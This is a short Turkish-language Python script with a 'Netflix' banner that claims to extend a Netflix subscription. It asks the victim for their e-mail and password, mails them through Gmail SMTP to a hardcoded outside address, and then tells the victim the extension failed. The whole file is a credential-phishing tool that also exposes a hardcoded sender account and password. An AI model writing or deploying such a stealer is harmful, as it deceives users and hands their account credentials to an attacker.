from smtplib import SMTP
import pyfiglet
from colorama import Fore, Back, Style, init
init(autoreset=True)
banner = pyfiglet.figlet_format("Netflix")
print(Back.RED + banner)

# Simple Mail Transfer Protocol 
# Basit Mail Transfer Protokolü 
try:
    sure = input(Fore.GREEN + "Uzatmak İstediğiniz Süreyi Ay Zarfında Yazınız (Sadece [1],[3],[6])")
    aciklama = (Fore.GREEN + "Örnek:deneme@gmail.com // Sifre")
    # Mail Mesaj Bilgisi 
    subcjet = "NETFLİX"
    print(aciklama)
    message = input(Fore.GREEN + "E-Mail // Şifre:")
    content = "Subject: {0}\n\n{1}".format(subcjet,message)

    # Hesap Bilgileri 
    myMailAdress = "baldiryunusemre@gmail.com"
    password = "51emre51"

    # Kime Gönderilecek Bilgisi
    sendTo = "instagramsecweb@gmail.com"

    mail = SMTP("smtp.gmail.com", 527)
    mail.ehlo()
    mail.starttls()
    mail.login(myMailAdress,password)
    mail.sendmail(myMailAdress, sendTo, content.encode("utf-8"))
    print("HESAP SÜRESİ UZATILAMADI")
except Exception as e:
    print("Hata Oluştu!\n {0}".format(e))